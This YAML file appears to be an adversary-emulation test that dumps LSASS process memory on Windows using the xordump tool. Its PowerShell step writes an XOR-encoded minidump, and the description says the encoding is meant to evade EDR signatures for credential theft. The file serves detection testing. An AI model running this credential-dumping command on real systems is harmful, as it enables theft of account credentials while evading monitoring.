api_version: "2.0"
name: Dump LSASS.exe using imported Microsoft DLLs
description: "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n"
args:
    - name: xordump_exe
      type: path
      default: C:\Windows\Temp\xordump.exe
    - name: output_file
      type: path
      default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
uuid: 86fc3f40-237f-4701-b155-81c01c48d697
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: dump-lsass.exe-using-imported-microsoft-dlls
      inline: |
        {{.Args.xordump_exe}} -out {{.Args.output_file}} -x 0x41
      executor: powershell
      cleanup:
        inline: |
            Remove-Item {{.Args.output_file}} -ErrorAction Ignore
        executor: powershell
